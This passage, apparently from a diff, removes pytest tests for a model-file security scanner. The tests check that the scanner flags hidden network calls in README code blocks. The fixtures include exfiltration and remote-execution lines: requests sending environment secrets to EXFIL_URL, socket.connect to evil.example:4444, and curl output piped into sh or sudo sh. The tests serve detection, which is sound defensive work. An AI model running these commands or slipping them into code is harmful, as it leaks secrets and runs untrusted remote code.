-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_annotated_aliased_fetch(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from collections.abc import Callable
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-requests.get(url)
-fetch: Callable[[str], object] = requests.get
-fetch(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_imported_aliased_fetch(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-from requests import get
-
-get("http://localhost:8080/v1/models")
-fetch = get
-fetch(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "requests"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_module_method_alias(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests as r
-
-api_url = "http://localhost:8080/v1/embeddings"
-send = r.post
-send(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "requests"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_chained_module_method_alias(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests as r
-
-api_url = "http://localhost:8080/v1/embeddings"
-send = r.post
-fetch = send
-fetch(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "requests"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_non_http_url(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-payload = "ssh://evil.example/x"
-requests.get(url, stream=True)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "ssh://evil.example/x"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_variable_active_call(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-api_url = "http://localhost:8080/v1/embeddings"
-payload_url = "https://evil.example/payload"
-requests.get(payload_url)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_dynamic_post(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-api_url = "http://localhost:8080/v1/embeddings"
-requests.post(os.environ["EXFIL_URL"], data=secret)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.post"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_getattr_post(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-payload = {"input": "secret"}
-getattr(requests, "post")("http://localhost:8080/v1/models", json=payload)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/models"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_mutated_target(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-url += os.environ["EXFIL_PATH"]
-requests.get(url, stream=True)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_dynamic_get(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-api_url = "http://localhost:8080/v1/embeddings"
-requests.get(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_reassigned_target(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-url = os.environ["EXFIL_URL"]
-requests.get(url)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_bare_active_url(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/embeddings
-curl https://evil.example/payload
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://evil.example/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_session_client(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-from requests import Session
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-image = requests.get(url)
-Session().get(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_aliased_session_client(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-image = requests.get(url)
-s = requests.Session()
-s.get(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "requests"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_socket_connect(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import socket
-
-api_url = "http://localhost:8080/v1/embeddings"
-socket.connect(("evil.example", 4444))
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "socket.connect"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_socket_alias_connect(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import socket
-
-api_url = "http://localhost:8080/v1/embeddings"
-s = socket.socket()
-s.connect(("evil.example", 4444))
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "socket"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_shell_path_execution_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/embeddings | /bin/sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_python_pipe_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/payload | python
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_env_python_pipe_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/payload | env python
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_shell_substitution_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-sh -c "$(curl http://localhost:8080/v1/payload)"
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and isinstance(check.details.get("url"), str)
-        and check.details["url"].startswith("http://localhost:8080/v1/payload")
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_sudo_shell_execution_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/payload | sudo sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_pipe_stderr_shell_execution_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/payload |& sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_plus_execution_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git && ./model/install.sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_then_execute_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-./model/install.sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_then_setup_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model
-python setup.py install
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_then_python_m_pip_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model
-python -m pip install .
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_then_python_m_build_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model
-python -m build
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize("checkout_command", ["pip install ./model", "python -m build model"])
-def test_text_scanner_fenced_documentation_github_clone_package_manager_path_remains_actionable(
-    tmp_path: Path,
-    checkout_command: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```bash
-git clone https://github.com/example-org/model.git
-{checkout_command}
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize(
-    "checkout_command",
-    [
-        "cd model/subdir\npip install .",
-        "cd model/subdir && pip install .",
-        "cd model\ncd subdir\npip install .",
-    ],
-)
-def test_text_scanner_fenced_documentation_github_clone_subdir_install_remains_actionable(
-    tmp_path: Path,
-    checkout_command: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```bash
-git clone https://github.com/example-org/model.git
-{checkout_command}
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_then_pip3_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model
-pip3 install .
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_then_popd_before_pip_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model
-popd
-pip install .
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_same_line_pip3_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model && pip3 install .
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_pushd_then_python_m_pip_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-pushd model
-python -m pip install .
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_listing_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model
-ls
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_github_clone_pushd_popd_before_install_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-pushd model
-popd
-pip3 install .
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_github_clone_cd_same_line_listing_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-cd model && ls
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-@pytest.mark.parametrize("leave_command", ["cd ..", "cd ../other"])
-def test_text_scanner_fenced_documentation_github_clone_leave_checkout_before_install_is_informational(
-    tmp_path: Path,
-    leave_command: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```bash
-git clone https://github.com/example-org/model.git
-cd model
-{leave_command}
-python setup.py install
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_github_clone_does_not_hide_github_download(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git && curl https://github.com/attacker/payload | sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://github.com/attacker/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_composed_target(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-requests.get(url or os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize(
-    "request_call",
-    [
-        'requests.get(url, params={"token": os.environ["EXFIL_TOKEN"]})',
-        'requests.get(url, headers={"Authorization": os.environ["EXFIL_TOKEN"]})',
-        'requests.get(url, stream=True, params={"token": os.environ["EXFIL_TOKEN"]})',
-        (
-            'requests.get("http://images.cocodataset.org/val2017/000000039769.jpg", '
-            'json={"token": os.environ["EXFIL_TOKEN"]})'
-        ),
-    ],
-)
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_active_kwargs(
-    tmp_path: Path,
-    request_call: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-{request_call}
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_annotated_reassignment(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
